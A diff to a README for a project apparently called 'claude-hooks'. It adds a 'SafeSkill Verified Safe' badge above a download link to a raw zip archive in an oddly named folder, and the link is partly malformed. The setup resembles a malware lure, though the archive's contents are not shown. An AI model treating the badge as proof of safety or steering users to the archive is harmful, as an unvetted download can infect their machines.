@@ -1,5 +1,7 @@
 # 🎉 claude-hooks - Enhance Your Coding Experience Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/exogameyt-claude-hooks)
+
 ## 🔗 Download Here
 [![Download claude-hooks](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip%https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip)](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip)
 
